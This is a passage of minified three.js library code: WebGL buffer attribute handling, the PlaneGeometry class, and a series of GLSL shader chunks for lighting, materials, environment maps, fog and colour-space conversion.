Uint8Array)x=i.UNSIGNED_BYTE;else if(h instanceof Uint8ClampedArray)x=i.UNSIGNED_BYTE;else throw new Error("THREE.WebGLAttributes: Unsupported buffer data format: "+h);return{buffer:E,type:x,bytesPerElement:h.BYTES_PER_ELEMENT,version:d.version,size:m}}function s(d,u,h){const p=u.array,m=u._updateRange,E=u.updateRanges;if(i.bindBuffer(h,d),m.count===-1&&E.length===0&&i.bufferSubData(h,0,p),E.length!==0){for(let x=0,f=E.length;x<f;x++){const c=E[x];t?i.bufferSubData(h,c.start*p.BYTES_PER_ELEMENT,p,c.start,c.count):i.bufferSubData(h,c.start*p.BYTES_PER_ELEMENT,p.subarray(c.start,c.start+c.count))}u.clearUpdateRanges()}m.count!==-1&&(t?i.bufferSubData(h,m.offset*p.BYTES_PER_ELEMENT,p,m.offset,m.count):i.bufferSubData(h,m.offset*p.BYTES_PER_ELEMENT,p.subarray(m.offset,m.offset+m.count)),m.count=-1),u.onUploadCallback()}function o(d){return d.isInterleavedBufferAttribute&&(d=d.data),n.get(d)}function a(d){d.isInterleavedBufferAttribute&&(d=d.data);const u=n.get(d);u&&(i.deleteBuffer(u.buffer),n.delete(d))}function l(d,u){if(d.isGLBufferAttribute){const p=n.get(d);(!p||p.version<d.version)&&n.set(d,{buffer:d.buffer,type:d.type,bytesPerElement:d.elementSize,version:d.version});return}d.isInterleavedBufferAttribute&&(d=d.data);const h=n.get(d);if(h===void 0)n.set(d,r(d,u));else if(h.version<d.version){if(h.size!==d.array.byteLength)throw new Error("THREE.WebGLAttributes: The size of the buffer attribute's array buffer does not match the original size. Resizing buffer attributes is not supported.");s(h.buffer,d,u),h.version=d.version}}return{get:o,remove:a,update:l}}class ds extends It{constructor(e=1,t=1,n=1,r=1){super(),this.type="PlaneGeometry",this.parameters={width:e,height:t,widthSegments:n,heightSegments:r};const s=e/2,o=t/2,a=Math.floor(n),l=Math.floor(r),d=a+1,u=l+1,h=e/a,p=t/l,m=[],E=[],x=[],f=[];for(let c=0;c<u;c++){const g=c*p-o;for(let _=0;_<d;_++){const v=_*h-s;E.push(v,-g,0),x.push(0,0,1),f.push(_/a),f.push(1-c/l)}}for(let c=0;c<l;c++)for(let g=0;g<a;g++){const _=g+d*c,v=g+d*(c+1),w=g+1+d*(c+1),M=g+1+d*c;m.push(_,v,M),m.push(v,w,M)}this.setIndex(m),this.setAttribute("position",new dt(E,3)),this.setAttribute("normal",new dt(x,3)),this.setAttribute("uv",new dt(f,2))}copy(e){return super.copy(e),this.parameters=Object.assign({},e.parameters),this}static fromJSON(e){return new ds(e.width,e.height,e.widthSegments,e.heightSegments)}}var hc=`#ifdef USE_ALPHAHASH
	if ( diffuseColor.a < getAlphaHashThreshold( vPosition ) ) discard;
#endif`,mc=`#ifdef USE_ALPHAHASH
	const float ALPHA_HASH_SCALE = 0.05;
	float hash2D( vec2 value ) {
		return fract( 1.0e4 * sin( 17.0 * value.x + 0.1 * value.y ) * ( 0.1 + abs( sin( 13.0 * value.y + value.x ) ) ) );
	}
	float hash3D( vec3 value ) {
		return hash2D( vec2( hash2D( value.xy ), value.z ) );
	}
	float getAlphaHashThreshold( vec3 position ) {
		float maxDeriv = max(
			length( dFdx( position.xyz ) ),
			length( dFdy( position.xyz ) )
		);
		float pixScale = 1.0 / ( ALPHA_HASH_SCALE * maxDeriv );
		vec2 pixScales = vec2(
			exp2( floor( log2( pixScale ) ) ),
			exp2( ceil( log2( pixScale ) ) )
		);
		vec2 alpha = vec2(
			hash3D( floor( pixScales.x * position.xyz ) ),
			hash3D( floor( pixScales.y * position.xyz ) )
		);
		float lerpFactor = fract( log2( pixScale ) );
		float x = ( 1.0 - lerpFactor ) * alpha.x + lerpFactor * alpha.y;
		float a = min( lerpFactor, 1.0 - lerpFactor );
		vec3 cases = vec3(
			x * x / ( 2.0 * a * ( 1.0 - a ) ),
			( x - 0.5 * a ) / ( 1.0 - a ),
			1.0 - ( ( 1.0 - x ) * ( 1.0 - x ) / ( 2.0 * a * ( 1.0 - a ) ) )
		);
		float threshold = ( x < ( 1.0 - a ) )
			? ( ( x < a ) ? cases.x : cases.y )
			: cases.z;
		return clamp( threshold , 1.0e-6, 1.0 );
	}
#endif`,_c=`#ifdef USE_ALPHAMAP
	diffuseColor.a *= texture2D( alphaMap, vAlphaMapUv ).g;
#endif`,gc=`#ifdef USE_ALPHAMAP
	uniform sampler2D alphaMap;
#endif`,vc=`#ifdef USE_ALPHATEST
	if ( diffuseColor.a < alphaTest ) discard;
#endif`,xc=`#ifdef USE_ALPHATEST
	uniform float alphaTest;
#endif`,Ec=`#ifdef USE_AOMAP
	float ambientOcclusion = ( texture2D( aoMap, vAoMapUv ).r - 1.0 ) * aoMapIntensity + 1.0;
	reflectedLight.indirectDiffuse *= ambientOcclusion;
	#if defined( USE_CLEARCOAT ) 
		clearcoatSpecularIndirect *= ambientOcclusion;
	#endif
	#if defined( USE_SHEEN ) 
		sheenSpecularIndirect *= ambientOcclusion;
	#endif
	#if defined( USE_ENVMAP ) && defined( STANDARD )
		float dotNV = saturate( dot( geometryNormal, geometryViewDir ) );
		reflectedLight.indirectSpecular *= computeSpecularOcclusion( dotNV, ambientOcclusion, material.roughness );
	#endif
#endif`,yc=`#ifdef USE_AOMAP
	uniform sampler2D aoMap;
	uniform float aoMapIntensity;
#endif`,Sc=`#ifdef USE_BATCHING
	attribute float batchId;
	uniform highp sampler2D batchingTexture;
	mat4 getBatchingMatrix( const in float i ) {
		int size = textureSize( batchingTexture, 0 ).x;
		int j = int( i ) * 4;
		int x = j % size;
		int y = j / size;
		vec4 v1 = texelFetch( batchingTexture, ivec2( x, y ), 0 );
		vec4 v2 = texelFetch( batchingTexture, ivec2( x + 1, y ), 0 );
		vec4 v3 = texelFetch( batchingTexture, ivec2( x + 2, y ), 0 );
		vec4 v4 = texelFetch( batchingTexture, ivec2( x + 3, y ), 0 );
		return mat4( v1, v2, v3, v4 );
	}
#endif`,Mc=`#ifdef USE_BATCHING
	mat4 batchingMatrix = getBatchingMatrix( batchId );
#endif`,bc=`vec3 transformed = vec3( position );
#ifdef USE_ALPHAHASH
	vPosition = vec3( position );
#endif`,Tc=`vec3 objectNormal = vec3( normal );
#ifdef USE_TANGENT
	vec3 objectTangent = vec3( tangent.xyz );
#endif`,Ac=`float G_BlinnPhong_Implicit( ) {
	return 0.25;
}
float D_BlinnPhong( const in float shininess, const in float dotNH ) {
	return RECIPROCAL_PI * ( shininess * 0.5 + 1.0 ) * pow( dotNH, shininess );
}
vec3 BRDF_BlinnPhong( const in vec3 lightDir, const in vec3 viewDir, const in vec3 normal, const in vec3 specularColor, const in float shininess ) {
	vec3 halfDir = normalize( lightDir + viewDir );
	float dotNH = saturate( dot( normal, halfDir ) );
	float dotVH = saturate( dot( viewDir, halfDir ) );
	vec3 F = F_Schlick( specularColor, 1.0, dotVH );
	float G = G_BlinnPhong_Implicit( );
	float D = D_BlinnPhong( shininess, dotNH );
	return F * ( G * D );
} // validated`,Rc=`#ifdef USE_IRIDESCENCE
	const mat3 XYZ_TO_REC709 = mat3(
		 3.2404542, -0.9692660,  0.0556434,
		-1.5371385,  1.8760108, -0.2040259,
		-0.4985314,  0.0415560,  1.0572252
	);
	vec3 Fresnel0ToIor( vec3 fresnel0 ) {
		vec3 sqrtF0 = sqrt( fresnel0 );
		return ( vec3( 1.0 ) + sqrtF0 ) / ( vec3( 1.0 ) - sqrtF0 );
	}
	vec3 IorToFresnel0( vec3 transmittedIor, float incidentIor ) {
		return pow2( ( transmittedIor - vec3( incidentIor ) ) / ( transmittedIor + vec3( incidentIor ) ) );
	}
	float IorToFresnel0( float transmittedIor, float incidentIor ) {
		return pow2( ( transmittedIor - incidentIor ) / ( transmittedIor + incidentIor ));
	}
	vec3 evalSensitivity( float OPD, vec3 shift ) {
		float phase = 2.0 * PI * OPD * 1.0e-9;
		vec3 val = vec3( 5.4856e-13, 4.4201e-13, 5.2481e-13 );
		vec3 pos = vec3( 1.6810e+06, 1.7953e+06, 2.2084e+06 );
		vec3 var = vec3( 4.3278e+09, 9.3046e+09, 6.6121e+09 );
		vec3 xyz = val * sqrt( 2.0 * PI * var ) * cos( pos * phase + shift ) * exp( - pow2( phase ) * var );
		xyz.x += 9.7470e-14 * sqrt( 2.0 * PI * 4.5282e+09 ) * cos( 2.2399e+06 * phase + shift[ 0 ] ) * exp( - 4.5282e+09 * pow2( phase ) );
		xyz /= 1.0685e-7;
		vec3 rgb = XYZ_TO_REC709 * xyz;
		return rgb;
	}
	vec3 evalIridescence( float outsideIOR, float eta2, float cosTheta1, float thinFilmThickness, vec3 baseF0 ) {
		vec3 I;
		float iridescenceIOR = mix( outsideIOR, eta2, smoothstep( 0.0, 0.03, thinFilmThickness ) );
		float sinTheta2Sq = pow2( outsideIOR / iridescenceIOR ) * ( 1.0 - pow2( cosTheta1 ) );
		float cosTheta2Sq = 1.0 - sinTheta2Sq;
		if ( cosTheta2Sq < 0.0 ) {
			return vec3( 1.0 );
		}
		float cosTheta2 = sqrt( cosTheta2Sq );
		float R0 = IorToFresnel0( iridescenceIOR, outsideIOR );
		float R12 = F_Schlick( R0, 1.0, cosTheta1 );
		float T121 = 1.0 - R12;
		float phi12 = 0.0;
		if ( iridescenceIOR < outsideIOR ) phi12 = PI;
		float phi21 = PI - phi12;
		vec3 baseIOR = Fresnel0ToIor( clamp( baseF0, 0.0, 0.9999 ) );		vec3 R1 = IorToFresnel0( baseIOR, iridescenceIOR );
		vec3 R23 = F_Schlick( R1, 1.0, cosTheta2 );
		vec3 phi23 = vec3( 0.0 );
		if ( baseIOR[ 0 ] < iridescenceIOR ) phi23[ 0 ] = PI;
		if ( baseIOR[ 1 ] < iridescenceIOR ) phi23[ 1 ] = PI;
		if ( baseIOR[ 2 ] < iridescenceIOR ) phi23[ 2 ] = PI;
		float OPD = 2.0 * iridescenceIOR * thinFilmThickness * cosTheta2;
		vec3 phi = vec3( phi21 ) + phi23;
		vec3 R123 = clamp( R12 * R23, 1e-5, 0.9999 );
		vec3 r123 = sqrt( R123 );
		vec3 Rs = pow2( T121 ) * R23 / ( vec3( 1.0 ) - R123 );
		vec3 C0 = R12 + Rs;
		I = C0;
		vec3 Cm = Rs - T121;
		for ( int m = 1; m <= 2; ++ m ) {
			Cm *= r123;
			vec3 Sm = 2.0 * evalSensitivity( float( m ) * OPD, float( m ) * phi );
			I += Cm * Sm;
		}
		return max( I, vec3( 0.0 ) );
	}
#endif`,wc=`#ifdef USE_BUMPMAP
	uniform sampler2D bumpMap;
	uniform float bumpScale;
	vec2 dHdxy_fwd() {
		vec2 dSTdx = dFdx( vBumpMapUv );
		vec2 dSTdy = dFdy( vBumpMapUv );
		float Hll = bumpScale * texture2D( bumpMap, vBumpMapUv ).x;
		float dBx = bumpScale * texture2D( bumpMap, vBumpMapUv + dSTdx ).x - Hll;
		float dBy = bumpScale * texture2D( bumpMap, vBumpMapUv + dSTdy ).x - Hll;
		return vec2( dBx, dBy );
	}
	vec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy, float faceDirection ) {
		vec3 vSigmaX = normalize( dFdx( surf_pos.xyz ) );
		vec3 vSigmaY = normalize( dFdy( surf_pos.xyz ) );
		vec3 vN = surf_norm;
		vec3 R1 = cross( vSigmaY, vN );
		vec3 R2 = cross( vN, vSigmaX );
		float fDet = dot( vSigmaX, R1 ) * faceDirection;
		vec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );
		return normalize( abs( fDet ) * surf_norm - vGrad );
	}
#endif`,Cc=`#if NUM_CLIPPING_PLANES > 0
	vec4 plane;
	#pragma unroll_loop_start
	for ( int i = 0; i < UNION_CLIPPING_PLANES; i ++ ) {
		plane = clippingPlanes[ i ];
		if ( dot( vClipPosition, plane.xyz ) > plane.w ) discard;
	}
	#pragma unroll_loop_end
	#if UNION_CLIPPING_PLANES < NUM_CLIPPING_PLANES
		bool clipped = true;
		#pragma unroll_loop_start
		for ( int i = UNION_CLIPPING_PLANES; i < NUM_CLIPPING_PLANES; i ++ ) {
			plane = clippingPlanes[ i ];
			clipped = ( dot( vClipPosition, plane.xyz ) > plane.w ) && clipped;
		}
		#pragma unroll_loop_end
		if ( clipped ) discard;
	#endif
#endif`,Pc=`#if NUM_CLIPPING_PLANES > 0
	varying vec3 vClipPosition;
	uniform vec4 clippingPlanes[ NUM_CLIPPING_PLANES ];
#endif`,Ic=`#if NUM_CLIPPING_PLANES > 0
	varying vec3 vClipPosition;
#endif`,Lc=`#if NUM_CLIPPING_PLANES > 0
	vClipPosition = - mvPosition.xyz;
#endif`,Dc=`#if defined( USE_COLOR_ALPHA )
	diffuseColor *= vColor;
#elif defined( USE_COLOR )
	diffuseColor.rgb *= vColor;
#endif`,Nc=`#if defined( USE_COLOR_ALPHA )
	varying vec4 vColor;
#elif defined( USE_COLOR )
	varying vec3 vColor;
#endif`,Oc=`#if defined( USE_COLOR_ALPHA )
	varying vec4 vColor;
#elif defined( USE_COLOR ) || defined( USE_INSTANCING_COLOR )
	varying vec3 vColor;
#endif`,Uc=`#if defined( USE_COLOR_ALPHA )
	vColor = vec4( 1.0 );
#elif defined( USE_COLOR ) || defined( USE_INSTANCING_COLOR )
	vColor = vec3( 1.0 );
#endif
#ifdef USE_COLOR
	vColor *= color;
#endif
#ifdef USE_INSTANCING_COLOR
	vColor.xyz *= instanceColor.xyz;
#endif`,Fc=`#define PI 3.141592653589793
#define PI2 6.283185307179586
#define PI_HALF 1.5707963267948966
#define RECIPROCAL_PI 0.3183098861837907
#define RECIPROCAL_PI2 0.15915494309189535
#define EPSILON 1e-6
#ifndef saturate
#define saturate( a ) clamp( a, 0.0, 1.0 )
#endif
#define whiteComplement( a ) ( 1.0 - saturate( a ) )
float pow2( const in float x ) { return x*x; }
vec3 pow2( const in vec3 x ) { return x*x; }
float pow3( const in float x ) { return x*x*x; }
float pow4( const in float x ) { float x2 = x*x; return x2*x2; }
float max3( const in vec3 v ) { return max( max( v.x, v.y ), v.z ); }
float average( const in vec3 v ) { return dot( v, vec3( 0.3333333 ) ); }
highp float rand( const in vec2 uv ) {
	const highp float a = 12.9898, b = 78.233, c = 43758.5453;
	highp float dt = dot( uv.xy, vec2( a,b ) ), sn = mod( dt, PI );
	return fract( sin( sn ) * c );
}
#ifdef HIGH_PRECISION
	float precisionSafeLength( vec3 v ) { return length( v ); }
#else
	float precisionSafeLength( vec3 v ) {
		float maxComponent = max3( abs( v ) );
		return length( v / maxComponent ) * maxComponent;
	}
#endif
struct IncidentLight {
	vec3 color;
	vec3 direction;
	bool visible;
};
struct ReflectedLight {
	vec3 directDiffuse;
	vec3 directSpecular;
	vec3 indirectDiffuse;
	vec3 indirectSpecular;
};
#ifdef USE_ALPHAHASH
	varying vec3 vPosition;
#endif
vec3 transformDirection( in vec3 dir, in mat4 matrix ) {
	return normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );
}
vec3 inverseTransformDirection( in vec3 dir, in mat4 matrix ) {
	return normalize( ( vec4( dir, 0.0 ) * matrix ).xyz );
}
mat3 transposeMat3( const in mat3 m ) {
	mat3 tmp;
	tmp[ 0 ] = vec3( m[ 0 ].x, m[ 1 ].x, m[ 2 ].x );
	tmp[ 1 ] = vec3( m[ 0 ].y, m[ 1 ].y, m[ 2 ].y );
	tmp[ 2 ] = vec3( m[ 0 ].z, m[ 1 ].z, m[ 2 ].z );
	return tmp;
}
float luminance( const in vec3 rgb ) {
	const vec3 weights = vec3( 0.2126729, 0.7151522, 0.0721750 );
	return dot( weights, rgb );
}
bool isPerspectiveMatrix( mat4 m ) {
	return m[ 2 ][ 3 ] == - 1.0;
}
vec2 equirectUv( in vec3 dir ) {
	float u = atan( dir.z, dir.x ) * RECIPROCAL_PI2 + 0.5;
	float v = asin( clamp( dir.y, - 1.0, 1.0 ) ) * RECIPROCAL_PI + 0.5;
	return vec2( u, v );
}
vec3 BRDF_Lambert( const in vec3 diffuseColor ) {
	return RECIPROCAL_PI * diffuseColor;
}
vec3 F_Schlick( const in vec3 f0, const in float f90, const in float dotVH ) {
	float fresnel = exp2( ( - 5.55473 * dotVH - 6.98316 ) * dotVH );
	return f0 * ( 1.0 - fresnel ) + ( f90 * fresnel );
}
float F_Schlick( const in float f0, const in float f90, const in float dotVH ) {
	float fresnel = exp2( ( - 5.55473 * dotVH - 6.98316 ) * dotVH );
	return f0 * ( 1.0 - fresnel ) + ( f90 * fresnel );
} // validated`,kc=`#ifdef ENVMAP_TYPE_CUBE_UV
	#define cubeUV_minMipLevel 4.0
	#define cubeUV_minTileSize 16.0
	float getFace( vec3 direction ) {
		vec3 absDirection = abs( direction );
		float face = - 1.0;
		if ( absDirection.x > absDirection.z ) {
			if ( absDirection.x > absDirection.y )
				face = direction.x > 0.0 ? 0.0 : 3.0;
			else
				face = direction.y > 0.0 ? 1.0 : 4.0;
		} else {
			if ( absDirection.z > absDirection.y )
				face = direction.z > 0.0 ? 2.0 : 5.0;
			else
				face = direction.y > 0.0 ? 1.0 : 4.0;
		}
		return face;
	}
	vec2 getUV( vec3 direction, float face ) {
		vec2 uv;
		if ( face == 0.0 ) {
			uv = vec2( direction.z, direction.y ) / abs( direction.x );
		} else if ( face == 1.0 ) {
			uv = vec2( - direction.x, - direction.z ) / abs( direction.y );
		} else if ( face == 2.0 ) {
			uv = vec2( - direction.x, direction.y ) / abs( direction.z );
		} else if ( face == 3.0 ) {
			uv = vec2( - direction.z, direction.y ) / abs( direction.x );
		} else if ( face == 4.0 ) {
			uv = vec2( - direction.x, direction.z ) / abs( direction.y );
		} else {
			uv = vec2( direction.x, direction.y ) / abs( direction.z );
		}
		return 0.5 * ( uv + 1.0 );
	}
	vec3 bilinearCubeUV( sampler2D envMap, vec3 direction, float mipInt ) {
		float face = getFace( direction );
		float filterInt = max( cubeUV_minMipLevel - mipInt, 0.0 );
		mipInt = max( mipInt, cubeUV_minMipLevel );
		float faceSize = exp2( mipInt );
		highp vec2 uv = getUV( direction, face ) * ( faceSize - 2.0 ) + 1.0;
		if ( face > 2.0 ) {
			uv.y += faceSize;
			face -= 3.0;
		}
		uv.x += face * faceSize;
		uv.x += filterInt * 3.0 * cubeUV_minTileSize;
		uv.y += 4.0 * ( exp2( CUBEUV_MAX_MIP ) - faceSize );
		uv.x *= CUBEUV_TEXEL_WIDTH;
		uv.y *= CUBEUV_TEXEL_HEIGHT;
		#ifdef texture2DGradEXT
			return texture2DGradEXT( envMap, uv, vec2( 0.0 ), vec2( 0.0 ) ).rgb;
		#else
			return texture2D( envMap, uv ).rgb;
		#endif
	}
	#define cubeUV_r0 1.0
	#define cubeUV_m0 - 2.0
	#define cubeUV_r1 0.8
	#define cubeUV_m1 - 1.0
	#define cubeUV_r4 0.4
	#define cubeUV_m4 2.0
	#define cubeUV_r5 0.305
	#define cubeUV_m5 3.0
	#define cubeUV_r6 0.21
	#define cubeUV_m6 4.0
	float roughnessToMip( float roughness ) {
		float mip = 0.0;
		if ( roughness >= cubeUV_r1 ) {
			mip = ( cubeUV_r0 - roughness ) * ( cubeUV_m1 - cubeUV_m0 ) / ( cubeUV_r0 - cubeUV_r1 ) + cubeUV_m0;
		} else if ( roughness >= cubeUV_r4 ) {
			mip = ( cubeUV_r1 - roughness ) * ( cubeUV_m4 - cubeUV_m1 ) / ( cubeUV_r1 - cubeUV_r4 ) + cubeUV_m1;
		} else if ( roughness >= cubeUV_r5 ) {
			mip = ( cubeUV_r4 - roughness ) * ( cubeUV_m5 - cubeUV_m4 ) / ( cubeUV_r4 - cubeUV_r5 ) + cubeUV_m4;
		} else if ( roughness >= cubeUV_r6 ) {
			mip = ( cubeUV_r5 - roughness ) * ( cubeUV_m6 - cubeUV_m5 ) / ( cubeUV_r5 - cubeUV_r6 ) + cubeUV_m5;
		} else {
			mip = - 2.0 * log2( 1.16 * roughness );		}
		return mip;
	}
	vec4 textureCubeUV( sampler2D envMap, vec3 sampleDir, float roughness ) {
		float mip = clamp( roughnessToMip( roughness ), cubeUV_m0, CUBEUV_MAX_MIP );
		float mipF = fract( mip );
		float mipInt = floor( mip );
		vec3 color0 = bilinearCubeUV( envMap, sampleDir, mipInt );
		if ( mipF == 0.0 ) {
			return vec4( color0, 1.0 );
		} else {
			vec3 color1 = bilinearCubeUV( envMap, sampleDir, mipInt + 1.0 );
			return vec4( mix( color0, color1, mipF ), 1.0 );
		}
	}
#endif`,zc=`vec3 transformedNormal = objectNormal;
#ifdef USE_TANGENT
	vec3 transformedTangent = objectTangent;
#endif
#ifdef USE_BATCHING
	mat3 bm = mat3( batchingMatrix );
	transformedNormal /= vec3( dot( bm[ 0 ], bm[ 0 ] ), dot( bm[ 1 ], bm[ 1 ] ), dot( bm[ 2 ], bm[ 2 ] ) );
	transformedNormal = bm * transformedNormal;
	#ifdef USE_TANGENT
		transformedTangent = bm * transformedTangent;
	#endif
#endif
#ifdef USE_INSTANCING
	mat3 im = mat3( instanceMatrix );
	transformedNormal /= vec3( dot( im[ 0 ], im[ 0 ] ), dot( im[ 1 ], im[ 1 ] ), dot( im[ 2 ], im[ 2 ] ) );
	transformedNormal = im * transformedNormal;
	#ifdef USE_TANGENT
		transformedTangent = im * transformedTangent;
	#endif
#endif
transformedNormal = normalMatrix * transformedNormal;
#ifdef FLIP_SIDED
	transformedNormal = - transformedNormal;
#endif
#ifdef USE_TANGENT
	transformedTangent = ( modelViewMatrix * vec4( transformedTangent, 0.0 ) ).xyz;
	#ifdef FLIP_SIDED
		transformedTangent = - transformedTangent;
	#endif
#endif`,Bc=`#ifdef USE_DISPLACEMENTMAP
	uniform sampler2D displacementMap;
	uniform float displacementScale;
	uniform float displacementBias;
#endif`,Gc=`#ifdef USE_DISPLACEMENTMAP
	transformed += normalize( objectNormal ) * ( texture2D( displacementMap, vDisplacementMapUv ).x * displacementScale + displacementBias );
#endif`,Hc=`#ifdef USE_EMISSIVEMAP
	vec4 emissiveColor = texture2D( emissiveMap, vEmissiveMapUv );
	totalEmissiveRadiance *= emissiveColor.rgb;
#endif`,Vc=`#ifdef USE_EMISSIVEMAP
	uniform sampler2D emissiveMap;
#endif`,Wc="gl_FragColor = linearToOutputTexel( gl_FragColor );",Xc=`
const mat3 LINEAR_SRGB_TO_LINEAR_DISPLAY_P3 = mat3(
	vec3( 0.8224621, 0.177538, 0.0 ),
	vec3( 0.0331941, 0.9668058, 0.0 ),
	vec3( 0.0170827, 0.0723974, 0.9105199 )
);
const mat3 LINEAR_DISPLAY_P3_TO_LINEAR_SRGB = mat3(
	vec3( 1.2249401, - 0.2249404, 0.0 ),
	vec3( - 0.0420569, 1.0420571, 0.0 ),
	vec3( - 0.0196376, - 0.0786361, 1.0982735 )
);
vec4 LinearSRGBToLinearDisplayP3( in vec4 value ) {
	return vec4( value.rgb * LINEAR_SRGB_TO_LINEAR_DISPLAY_P3, value.a );
}
vec4 LinearDisplayP3ToLinearSRGB( in vec4 value ) {
	return vec4( value.rgb * LINEAR_DISPLAY_P3_TO_LINEAR_SRGB, value.a );
}
vec4 LinearTransferOETF( in vec4 value ) {
	return value;
}
vec4 sRGBTransferOETF( in vec4 value ) {
	return vec4( mix( pow( value.rgb, vec3( 0.41666 ) ) * 1.055 - vec3( 0.055 ), value.rgb * 12.92, vec3( lessThanEqual( value.rgb, vec3( 0.0031308 ) ) ) ), value.a );
}
vec4 LinearToLinear( in vec4 value ) {
	return value;
}
vec4 LinearTosRGB( in vec4 value ) {
	return sRGBTransferOETF( value );
}`,qc=`#ifdef USE_ENVMAP
	#ifdef ENV_WORLDPOS
		vec3 cameraToFrag;
		if ( isOrthographic ) {
			cameraToFrag = normalize( vec3( - viewMatrix[ 0 ][ 2 ], - viewMatrix[ 1 ][ 2 ], - viewMatrix[ 2 ][ 2 ] ) );
		} else {
			cameraToFrag = normalize( vWorldPosition - cameraPosition );
		}
		vec3 worldNormal = inverseTransformDirection( normal, viewMatrix );
		#ifdef ENVMAP_MODE_REFLECTION
			vec3 reflectVec = reflect( cameraToFrag, worldNormal );
		#else
			vec3 reflectVec = refract( cameraToFrag, worldNormal, refractionRatio );
		#endif
	#else
		vec3 reflectVec = vReflect;
	#endif
	#ifdef ENVMAP_TYPE_CUBE
		vec4 envColor = textureCube( envMap, vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );
	#else
		vec4 envColor = vec4( 0.0 );
	#endif
	#ifdef ENVMAP_BLENDING_MULTIPLY
		outgoingLight = mix( outgoingLight, outgoingLight * envColor.xyz, specularStrength * reflectivity );
	#elif defined( ENVMAP_BLENDING_MIX )
		outgoingLight = mix( outgoingLight, envColor.xyz, specularStrength * reflectivity );
	#elif defined( ENVMAP_BLENDING_ADD )
		outgoingLight += envColor.xyz * specularStrength * reflectivity;
	#endif
#endif`,Yc=`#ifdef USE_ENVMAP
	uniform float envMapIntensity;
	uniform float flipEnvMap;
	#ifdef ENVMAP_TYPE_CUBE
		uniform samplerCube envMap;
	#else
		uniform sampler2D envMap;
	#endif
	
#endif`,jc=`#ifdef USE_ENVMAP
	uniform float reflectivity;
	#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) || defined( LAMBERT )
		#define ENV_WORLDPOS
	#endif
	#ifdef ENV_WORLDPOS
		varying vec3 vWorldPosition;
		uniform float refractionRatio;
	#else
		varying vec3 vReflect;
	#endif
#endif`,Kc=`#ifdef USE_ENVMAP
	#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG ) || defined( LAMBERT )
		#define ENV_WORLDPOS
	#endif
	#ifdef ENV_WORLDPOS
		
		varying vec3 vWorldPosition;
	#else
		varying vec3 vReflect;
		uniform float refractionRatio;
	#endif
#endif`,$c=`#ifdef USE_ENVMAP
	#ifdef ENV_WORLDPOS
		vWorldPosition = worldPosition.xyz;
	#else
		vec3 cameraToVertex;
		if ( isOrthographic ) {
			cameraToVertex = normalize( vec3( - viewMatrix[ 0 ][ 2 ], - viewMatrix[ 1 ][ 2 ], - viewMatrix[ 2 ][ 2 ] ) );
		} else {
			cameraToVertex = normalize( worldPosition.xyz - cameraPosition );
		}
		vec3 worldNormal = inverseTransformDirection( transformedNormal, viewMatrix );
		#ifdef ENVMAP_MODE_REFLECTION
			vReflect = reflect( cameraToVertex, worldNormal );
		#else
			vReflect = refract( cameraToVertex, worldNormal, refractionRatio );
		#endif
	#endif
#endif`,Zc=`#ifdef USE_FOG
	vFogDepth = - mvPosition.z;
#endif`,Qc=`#ifdef USE_FOG
	varying float vFogDepth;
#endif`,Jc=`#ifdef USE_FOG
	#ifdef FOG_EXP2
		float fogFactor = 1.0 - exp( - fogDensity * fogDensity * vFogDepth * vFogDepth );
	#else
		float fogFactor = smoothstep( fogNear, fogFar, vFogDepth );
	#endif
	gl_FragColor.rgb = mix( gl_FragColor.rgb, fogColor, fogFactor );
#endif`,ed=`#ifdef USE_FOG
	uniform vec3 fogColor;
	varying float vFogDepth;
	#ifdef FOG_EXP2
		uniform float fogDensity;
	#else
		uniform float fogNear;
		uniform float fogFar;
	#endif
#endif`,td=`#ifdef USE_GRADIENTMAP
	uniform sampler2D gradientMap;
#endif
vec3 getGradientIrradiance( vec3 normal, vec3 lightDirection ) {
	float dotNL = dot( normal, lightDirection );
	vec2 coord = vec2( dotNL * 0.5 + 0.5, 0.0 );
	#ifdef USE_GRADIENTMAP
		return vec3( texture2D( gradientMap, coord ).r );
	#else
		vec2 fw = fwidth( coord ) * 0.5;
		return mix( vec3( 0.7 ), vec3( 1.0 ), smoothstep( 0.7 - fw.x, 0.7 + fw.x, coord.x ) );
	#endif
}`,nd=`#ifdef USE_LIGHTMAP
	vec4 lightMapTexel = texture2D( lightMap, vLightMapUv );
	vec3 lightMapIrradiance = lightMapTexel.rgb * lightMapIntensity;
	reflectedLight.indirectDiffuse += lightMapIrradiance;
#endif`,id=`#ifdef USE_LIGHTMAP
	uniform sampler2D lightMap;
	uniform float lightMapIntensity;
#endif`,rd=`LambertMaterial material;
material.diffuseColor = diffuseColor.rgb;
material.specularStrength = specularStrength;`,sd=`varying vec3 vViewPosition;
struct LambertMaterial {
	vec3 diffuseColor;
	float specularStrength;
};
void RE_Direct_Lambert( const in IncidentLight directLight, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in LambertMaterial material, inout ReflectedLight reflectedLight ) {
	float dotNL = saturate( dot( geometryNormal, directLight.direction ) );
	vec3 irradiance = dotNL * directLight.color;
	reflectedLight.directDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
void RE_IndirectDiffuse_Lambert( const in vec3 irradiance, const in vec3 geometryPosition, const in vec3 geometryNormal, const in vec3 geometryViewDir, const in vec3 geometryClearcoatNormal, const in LambertMaterial material, inout ReflectedLight reflectedLight ) {
	reflectedLight.indirectDiffuse += irradiance * BRDF_Lambert( material.diffuseColor );
}
#define RE_Direct				RE_Direct_Lambert
#define RE_IndirectDiffuse		RE_IndirectDiffuse_Lambert`,ad=`uniform bool receiveShadow;
uniform vec3 ambientLightColor;
#if defined( USE_LIGHT_PROBES )
	uniform vec3 lightProbe[ 9 ];
#endif
vec3 shGetIrradianceAt( in vec3 normal, in vec3 shCoefficients[ 9 ] ) {
	float x = normal.x, y = normal.y, z = normal.z;
	vec3 result = shCoefficients[ 0 ] * 0.886227;
	result += shCoefficients[ 1 ] * 2.0 * 0.511664 * y;
	result += shCoefficients[ 2 ] * 2.0 * 0.511664 * z;
	result += shCoefficients[ 3 ] * 2.0 * 0.511664 * x;
	result += shCoefficients[ 4 ] * 2.0 * 0.429043 * x * y;
	result += shCoefficients[ 5 ] * 2.0 * 0.429043 * y * z;
